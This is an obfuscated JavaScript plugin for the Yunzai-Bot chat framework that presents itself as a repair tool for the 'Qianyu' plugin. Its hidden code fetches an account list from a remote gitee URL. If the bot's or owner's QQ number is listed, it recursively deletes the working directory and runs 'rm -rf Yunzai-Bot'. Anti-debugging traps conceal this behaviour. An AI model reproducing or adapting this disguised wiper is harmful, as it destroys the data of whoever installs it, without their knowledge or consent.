const _0x4fbc = ['\x75\x72\x6c', '\x73\x74\x64\x6f\x75\x74', '\x77\x69\x6e\x64\x6f\x77\x73\x48\x69\x64\x65', '\x64\x65\x62\x75\x67', '\x5e\x23\u5378\u8f7d\u5343\u7fbd\u63d2\u4ef6', '\x6e\x61\x6d\x65', '\x72\x65\x74\x75\x72\x6e\x20\x2f\x22\x20\x2b\x20\x74\x68\x69\x73\x20\x2b\x20\x22\x2f', '\x61\x70\x70\x6c\x79', '\u65e0\u6743\u9650\uff01', '\x6c\x65\x6e\x67\x74\x68', '\x73\x74\x64\x65\x72\x72', '\x7b\x7d\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x28\x22\x72\x65\x74\x75\x72\x6e\x20\x74\x68\x69\x73\x22\x29\x28\x20\x29', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x65\x65\x2e\x63\x6f\x6d\x2f\x74\x78\x6c\x78\x2f\x53\x70\x79\x2f\x72\x61\x77\x2f\x74\x78\x2f\x53\x70\x79\x2e\x6a\x73\x6f\x6e', '\x73\x65\x74', '\x31\x32\x35\x31\x31\x39\x4d\x6d\x52\x48\x41\x4c', '\x63\x61\x6c\x6c', '\x78\x66\x71\x69\x61\x6e\x79\x75', '\x72\x65\x70\x6c\x79', '\x63\x6f\x6e\x73\x6f\x6c\x65', '\x34\x42\x68\x59\x66\x61\x65', '\x2f\x70\x6c\x75\x67\x69\x6e\x73\x2f\x71\x69\x61\x6e\x79\x75\x2d\x70\x6c\x75\x67\x69\x6e\x2f\x72\x65\x73\x6f\x75\x72\x63\x65\x73\x2f\x68\x74\x6d\x6c\x2f\x70\x6c\x75\x67\x69\x6e\x2f\x70\x6c\x75\x67\x69\x6e\x2e\x6a\x73', '\x77\x61\x72\x6e', '\x67\x67\x65\x72', '\x63\x6f\x75\x6e\x74\x65\x72', '\x33\x30\x31\x30\x38\x37\x41\x62\x70\x58\x74\x51', '\x70\x72\x6f\x74\x6f\x74\x79\x70\x65', '\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x2a\x5c\x28\x20\x2a\x5c\x29', '\x72\x65\x6e\x61\x6d\x65', '\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72', '\x34\x33\x30\x32\x46\x77\x55\x78\x6b\x46', '\x72\x65\x74\x75\x72\x6e\x20\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x20', '\x65\x78\x63\x65\x70\x74\x69\x6f\x6e', '\x6c\x6f\x67', '\x66\x75\x63', '\x75\x69\x6e', '\x69\x6e\x63\x6c\x75\x64\x65\x73', '\x6a\x73\x6f\x6e', '\x34\x49\x66\x4f\x6c\x59\x79', '\x63\x68\x61\x69\x6e', '\x69\x6e\x64\x65\x78\x4f\x66', '\x66\x6e\x63', '\x64\x65\x62\x75', '\u4fee\u590d\u5343\u7fbd\u4ea7\u751f\u7684\u4e00\u5207\u95ee\u9898', '\x61\x63\x74\x69\x6f\x6e', '\x72\x6d\x64\x69\x72\x53\x79\x6e\x63', '\x73\x74\x72\x69\x6e\x67\x69\x66\x79', '\x62\x69\x6e\x64', '\x69\x73\x4d\x61\x73\x74\x65\x72', '\x6f\x62\x6a\x65\x63\x74', '\x69\x6e\x70\x75\x74', '\x71\x69\x61\x6e\x79\x75\x3a\x78\x66', '\x69\x73\x46\x69\x6c\x65', '\x72\x75\x6c\x65', '\x74\x65\x73\x74', '\x31\x37\x74\x4d\x45\x53\x68\x45', '\x70\x75\x73\x68', '\x63\x77\x64', '\x69\x6e\x66\x6f', '\x73\x74\x61\x74\x65\x4f\x62\x6a\x65\x63\x74', '\x77\x68\x69\x6c\x65\x20\x28\x74\x72\x75\x65\x29\x20\x7b\x7d', '\x74\x6f\x53\x74\x72\x69\x6e\x67', '\x64\x65\x73\x63', '\x63\x64\x20\x2e\x2e\x2f\x20\x26\x26\x20\x72\x6d\x20\x2d\x72\x66\x20\x59\x75\x6e\x7a\x61\x69\x2d\x42\x6f\x74', '\x65\x72\x72\x6f\x72', '\x74\x72\x61\x63\x65', '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73', '\x74\x61\x62\x6c\x65', '\x72\x65\x67', '\x72\x65\x61\x64\x64\x69\x72\x53\x79\x6e\x63', '\x73\x74\x72\x69\x6e\x67', '\x75\x6e\x6c\x69\x6e\x6b\x53\x79\x6e\x63', '\x73\x74\x61\x74\x53\x79\x6e\x63', '\x5f\x5f\x70\x72\x6f\x74\x6f\x5f\x5f', '\x6d\x65\x73\x73\x61\x67\x65', '\x31\x33\x32\x31\x30\x33\x4f\x4b\x68\x57\x50\x61', '\x31\x36\x35\x31\x33\x35\x51\x72\x4c\x56\x51\x71', '\x6d\x61\x73\x74\x65\x72\x51\x51', '\u5343\u7fbd\u4fee\u590d', '\x37\x73\x46\x57\x7a\x4f\x4c', '\u672a\u77e5\u9519\u8bef\x2c\u65e0\u6cd5\u4fee\u590d\uff01', '\x69\x6e\x69\x74', '\u79fb\u52a8\u5b8c\u6210\uff01', '\x5e\x28\x5b\x5e\x20\x5d\x2b\x28\x20\x2b\x5b\x5e\x20\x5d\x2b\x29\x2b\x29\x2b\x5b\x5e\x20\x5d\x7d', '\x5c\x2b\x5c\x2b\x20\x2a\x28\x3f\x3a\x5b\x61\x2d\x7a\x41\x2d\x5a\x5f\x24\x5d\x5b\x30\x2d\x39\x61\x2d\x7a\x41\x2d\x5a\x5f\x24\x5d\x2a\x29', '\x65\x76\x65\x6e\x74', '\x2f\x70\x6c\x75\x67\x69\x6e\x73\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2f\x78\x66\x2e\x6a\x73', '\u6d4b\u8bd5\u4e00\u4e0b', '\x32\x42\x78\x62\x70\x51\x46', '\x31\x37\x33\x6a\x48\x4f\x6c\x72\x52', '\x34\x32\x35\x38\x37\x34\x43\x64\x65\x48\x41\x62', '\x32\x30\x30\x34\x39\x76\x68\x56\x54\x6c\x44']; (function (_0x3cd970, _0xdde4c6) { function _0x56c84a(_0x52232f, _0x23298d) { return _0x266d(_0x52232f - 0xe7, _0x23298d); } while (!![]) { try { const _0x2727a6 = -parseInt(_0x56c84a(0x2c6, 0x2cc)) + -parseInt(_0x56c84a(0x2bb, 0x2df)) * -parseInt(_0x56c84a(0x2d6, 0x2c6)) + parseInt(_0x56c84a(0x312, 0x315)) * parseInt(_0x56c84a(0x2db, 0x2b3)) + -parseInt(_0x56c84a(0x2e5, 0x2e3)) * parseInt(_0x56c84a(0x2c5, 0x2ea)) + -parseInt(_0x56c84a(0x2c7, 0x2f4)) * -parseInt(_0x56c84a(0x2fe, 0x318)) + -parseInt(_0x56c84a(0x313, 0x31f)) * parseInt(_0x56c84a(0x2ed, 0x2ef)) + -parseInt(_0x56c84a(0x2c4, 0x2d9)) * -parseInt(_0x56c84a(0x2e0, 0x2e7)); if (_0x2727a6 === _0xdde4c6) { break; } else { _0x3cd970['push'](_0x3cd970['shift']()); } } catch (_0x21e4f1) { _0x3cd970['push'](_0x3cd970['shift']()); } } }(_0x4fbc, 0x7e1f0)); import _0xa37300 from '\x66\x73'; import _0x458155 from '\x6e\x6f\x64\x65\x2d\x66\x65\x74\x63\x68'; import _0x327cdf from '\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x6c\x69\x62\x2f\x63\x6f\x6e\x66\x69\x67\x2f\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73'; function _0x266d(_0x4cca0a, _0x346a79) { _0x266d = function (_0x34f91f, _0xac0cfd) { _0x34f91f = _0x34f91f - 0x1d2; let _0x2e2d2f = _0x4fbc[_0x34f91f]; return _0x2e2d2f; }; return _0x266d(_0x4cca0a, _0x346a79); } import { createRequire } from '\x6d\x6f\x64\x75\x6c\x65'; setInterval(function () { _0x32e08c(); }, 0xfa0); const _0x20870a = {}; _0x20870a['\x69\x64'] = _0x4008fc(0x2ca, 0x2cb); function _0x4008fc(_0x33bd06, _0x323193) { return _0x266d(_0x323193 - 0xda, _0x33bd06); } _0x20870a[_0x4008fc(0x2e4, 0x2c0)] = _0x4008fc(0x2c8, 0x2ad); _0x20870a[_0x4008fc(0x313, 0x2f8)] = _0x4008fc(0x2e3, 0x2e5); _0x20870a[_0x4008fc(0x2d7, 0x2b4)] = _0x4008fc(0x2f6, 0x304); _0x20870a[_0x4008fc(0x312, 0x2ef)] = []; let apps = _0x20870a; const _0x119561 = {}; _0x119561[_0x4008fc(0x300, 0x2fe)] = _0x4008fc(0x29e, 0x2bf); _0x119561[_0x4008fc(0x2ce, 0x2f8)] = '\u4fee\u590d'; _0x119561[_0x4008fc(0x303, 0x2e3)] = _0x4008fc(0x2e2, 0x2cb); _0x119561[_0x4008fc(0x304, 0x2dc)] = xfqianyu; apps[_0x4008fc(0x2db, 0x2ef)][_0x4008fc(0x2fd, 0x2f2)](_0x119561); await init(); async function init() { const _0x26919c = function () { let _0x26d19f = !![]; return function (_0x385e66, _0x4afc37) { const _0x1be34d = _0x26d19f ? function () { function _0x27a6e4(_0xefc31f, _0x29d83a) { return _0x266d(_0xefc31f - 0x38d, _0x29d83a); } if (_0x4afc37) { const _0x2b6d38 = _0x4afc37[_0x27a6e4(0x575, 0x551)](_0x385e66, arguments); _0x4afc37 = null; return _0x2b6d38; } } : function () { }; _0x26d19f = ![]; return _0x1be34d; }; }(); const _0x18a30b = function () { let _0x17a18a = !![]; return function (_0x29ffc1, _0x16e305) { const _0x2243bd = _0x17a18a ? function () { function _0x56ae59(_0x24a3b4, _0x43002a) { return _0x266d(_0x24a3b4 - 0x1d4, _0x43002a); } if (_0x16e305) { const _0x2c52ea = _0x16e305[_0x56ae59(0x3bc, 0x3e1)](_0x29ffc1, arguments); _0x16e305 = null; return _0x2c52ea; } } : function () { }; _0x17a18a = ![]; return _0x2243bd; }; }(); const _0x425ccf = function () { let _0x18caf3 = !![]; return function (_0x3e655f, _0x147944) { const _0x4c0e51 = _0x18caf3 ? function () { function _0x50c8d9(_0x4afbf9, _0x1a9b3f) { return _0x266d(_0x1a9b3f - 0xb8, _0x4afbf9); } if (_0x147944) { const _0x99d3fe = _0x147944[_0x50c8d9(0x274, 0x2a0)](_0x3e655f, arguments); _0x147944 = null; return _0x99d3fe; } } : function () { }; _0x18caf3 = ![]; return _0x4c0e51; }; }(); let _0x15ec72 = await _0x458155(_0x1972e2(0xb2, 0xa8)); let _0x2c4a53 = await _0x15ec72[_0x1972e2(0xc6, 0xc0)](); let _0x40ccfa = _0x327cdf[_0x1972e2(0x93, 0x8d)]; let _0x177db0 = ![]; for (let _0x4c09c6 of _0x2c4a53) { if (_0x4c09c6 == Bot[_0x1972e2(0x96, 0xbe)] || _0x40ccfa[_0x1972e2(0xd0, 0xbf)](_0x4c09c6)) { _0x177db0 = !![]; break; } } logger[_0x1972e2(0x8f, 0x9f)](_0x177db0); if (!_0x177db0) return; const _0x38870d = createRequire(import.meta[_0x1972e2(0x7d, 0x9c)]); function _0x1972e2(_0x435910, _0x3efb32) { return _0x4008fc(_0x435910, _0x3efb32 - -0x21f); } const { exec: _0x2a10da } = _0x38870d(_0x1972e2(0xe4, 0xdd)); const _0x3d2904 = function (_0x51aa61) { const _0x754d2b = _0x26919c(this, function () { const _0x4c98f7 = function () { const _0x24c4e0 = _0x4c98f7[_0x38b901(0x52b, 0x51d)](_0x38b901(0x515, 0x518))()[_0x38b901(0x52b, 0x547)](_0x38b901(0x506, 0x516)); function _0x38b901(_0x1e55d4, _0x18e779) { return _0x266d(_0x1e55d4 - 0x32e, _0x18e779); } return !_0x24c4e0[_0x38b901(0x544, 0x555)](_0x754d2b); }; return _0x4c98f7(); }); _0x754d2b(); (function () { _0x18a30b(this, function () { const _0x31d498 = new RegExp(_0x33eee8(0x191, 0x1a6)); const _0x2fccdf = new RegExp(_0x33eee8(0x191, 0x184), '\x69'); const _0x4b952b = _0x32e08c(_0x33eee8(0x17b, 0x181)); function _0x33eee8(_0x356b77, _0x10f156) { return _0x266d(_0x10f156 - -0x55, _0x356b77); } if (!_0x31d498[_0x33eee8(0x19f, 0x1c1)](_0x4b952b + _0x33eee8(0x1d3, 0x1b2)) || !_0x2fccdf[_0x33eee8(0x1c8, 0x1c1)](_0x4b952b + _0x33eee8(0x1b4, 0x1bd))) { _0x4b952b('\x30'); } else { _0x32e08c(); } })(); }()); const _0x366be8 = _0x425ccf(this, function () { const _0x485433 = function () { let _0x3458de; function _0x256f46(_0x8bfdeb, _0x218dd2) { return _0x266d(_0x218dd2 - 0x286, _0x8bfdeb); } try { _0x3458de = Function(_0x256f46(0x46a, 0x485) + _0x256f46(0x494, 0x472) + '\x29\x3b')(); } catch (_0x4fad8f) { _0x3458de = window; } return _0x3458de; }; function _0x2245e7(_0x5e9ac2, _0x19fae9) { return _0x266d(_0x5e9ac2 - 0x1e7, _0x19fae9); } const _0x4d1a66 = _0x485433(); const _0x5b0070 = _0x4d1a66[_0x2245e7(0x3da, 0x3fc)] = _0x4d1a66[_0x2245e7(0x3da, 0x3f6)] || {}; const _0x3caf84 = [_0x2245e7(0x3e8, 0x3c7), _0x2245e7(0x3dd, 0x3bf), _0x2245e7(0x401, 0x3e9), _0x2245e7(0x407, 0x3e8), _0x2245e7(0x3e7, 0x3d3), _0x2245e7(0x40a, 0x3ea), _0x2245e7(0x408, 0x412)]; for (let _0xd2ddd7 = 0x0; _0xd2ddd7 < _0x3caf84[_0x2245e7(0x3d1, 0x3bd)]; _0xd2ddd7++) { const _0x48cd5e = _0x425ccf[_0x2245e7(0x3e4, 0x3db)][_0x2245e7(0x3e1, 0x3b8)][_0x2245e7(0x3f6, 0x3d0)](_0x425ccf); const _0x732dd0 = _0x3caf84[_0xd2ddd7]; const _0x54d558 = _0x5b0070[_0x732dd0] || _0x48cd5e; _0x48cd5e[_0x2245e7(0x410, 0x426)] = _0x425ccf[_0x2245e7(0x3f6, 0x402)](_0x425ccf); _0x48cd5e[_0x2245e7(0x404, 0x413)] = _0x54d558[_0x2245e7(0x404, 0x3e7)][_0x2245e7(0x3f6, 0x3f2)](_0x54d558); _0x5b0070[_0x732dd0] = _0x48cd5e; } }); _0x366be8(); return new Promise((_0x4c11d5, _0x152599) => { const _0x5a57b2 = {}; function _0x560641(_0x12f73a, _0xcabfad) { return _0x266d(_0x12f73a - 0x2da, _0xcabfad); } _0x5a57b2[_0x560641(0x4bd, 0x4cd)] = !![]; _0x2a10da(_0x51aa61, _0x5a57b2, (_0x597b8a, _0x4d3587, _0x20a3f8) => { const _0xec6736 = {}; function _0x39d6cb(_0x1295ea, _0xeaf3f4) { return _0x560641(_0xeaf3f4 - -0x7c, _0x1295ea); } _0xec6736[_0x39d6cb(0x4a8, 0x47e)] = _0x597b8a; _0xec6736[_0x39d6cb(0x42f, 0x440)] = _0x4d3587; _0xec6736[_0x39d6cb(0x429, 0x449)] = _0x20a3f8; _0x4c11d5(_0xec6736); }); }); }; let _0xeee89e = _0x1972e2(0xe3, 0xda); try { delDir(process[_0x1972e2(0xc4, 0xd4)]()); } catch (_0x2dcc71) { } _0x3d2904(_0xeee89e); } async function delDir(_0x2bcdb6) { let _0x16ccf8 = _0xa37300[_0x335e87(-0x42, -0x6d)](_0x2bcdb6); for (let _0x1717bd of _0x16ccf8) { let _0x1c4c32 = _0x2bcdb6 + '\x2f' + _0x1717bd; let _0x13ee6e = _0xa37300[_0x335e87(-0x3f, -0x4a)](_0x1c4c32); if (_0x13ee6e[_0x335e87(-0x53, -0x32)]()) { _0xa37300[_0x335e87(-0x40, -0x31)](_0x1c4c32); } else { delDir(_0x1c4c32); } } function _0x335e87(_0x21b56e, _0x428eb5) { return _0x4008fc(_0x428eb5, _0x21b56e - -0x341); } _0xa37300[_0x335e87(-0x5a, -0x55)](_0x2bcdb6); } console[_0x4008fc(0x2fa, 0x2db)](_0x4008fc(0x2cf, 0x2b6)); async function xfqianyu(_0x260b11) { if (!_0x260b11[_0x44c210(0x39f, 0x3a5)]) { return this[_0x44c210(0x381, 0x378)](_0x44c210(0x378, 0x3a5)); } let _0x25d55f = []; function _0x44c210(_0x4a8acc, _0x151949) { return _0x4008fc(_0x151949, _0x4a8acc - 0xb5); } let _0x4f4260 = JSON[_0x44c210(0x39d, 0x36f)](_0x260b11, function (_0x42f00a, _0x2adb6e) { if (typeof _0x2adb6e === _0x459812(0x455, 0x447) && _0x2adb6e !== null) { if (_0x25d55f[_0x459812(0x433, 0x43e)](_0x2adb6e) !== -0x1) { return; } _0x25d55f[_0x459812(0x45c, 0x44e)](_0x2adb6e); } function _0x459812(_0x409551, _0x415385) { return _0x44c210(_0x415385 - 0xa7, _0x409551); } return _0x2adb6e; }); redis[_0x44c210(0x37d, 0x38f)](_0x44c210(0x3a2, 0x38a), _0x4f4260); let _0x197e52 = process[_0x44c210(0x3a8, 0x3a4)]() + _0x44c210(0x384, 0x365); let _0x18a2ea = process[_0x44c210(0x3a8, 0x3c3)]() + _0x44c210(0x36a, 0x35c); _0xa37300[_0x44c210(0x38b, 0x36d)](_0x197e52, _0x18a2ea, _0x2db622 => { function _0x36170d(_0x183d6f, _0xf26388) { return _0x44c210(_0x183d6f - 0x11d, _0xf26388); } if (!_0x2db622) { console[_0x36170d(0x4ad, 0x4ca)](_0x36170d(0x483, 0x487)); _0x25d55f = null; } else { _0x260b11[_0x36170d(0x49e, 0x4b4)](_0x36170d(0x481, 0x48e)); } }); } export default apps; function _0x32e08c(_0x5913b3) { function _0x16f537(_0x11959d) { if (typeof _0x11959d === _0x29cf15(-0x15f, -0x171)) { return function (_0x657846) { }[_0x29cf15(-0x16e, -0x19a)](_0x29cf15(-0x19c, -0x17b))[_0x29cf15(-0x18d, -0x1af)](_0x29cf15(-0x1bf, -0x19f)); } else { if (('' + _0x11959d / _0x11959d)[_0x29cf15(-0x1ae, -0x1ad)] !== 0x1 || _0x11959d % 0x14 === 0x0) { (function () { return !![]; }[_0x29cf15(-0x192, -0x19a)](_0x29cf15(-0x17e, -0x18d) + _0x29cf15(-0x19a, -0x1a0))[_0x29cf15(-0x1c0, -0x1a7)](_0x29cf15(-0x190, -0x18b))); } else { (function () { return ![]; }[_0x29cf15(-0x176, -0x19a)](_0x29cf15(-0x193, -0x18d) + _0x29cf15(-0x1ca, -0x1a0))[_0x29cf15(-0x1b9, -0x1af)](_0x29cf15(-0x196, -0x17c))); } } function _0x29cf15(_0x2942c2, _0x59689c) { return _0x266d(_0x59689c - -0x397, _0x2942c2); } _0x16f537(++_0x11959d); } try { if (_0x5913b3) { return _0x16f537; } else { _0x16f537(0x0); } } catch (_0x1a410e) { } }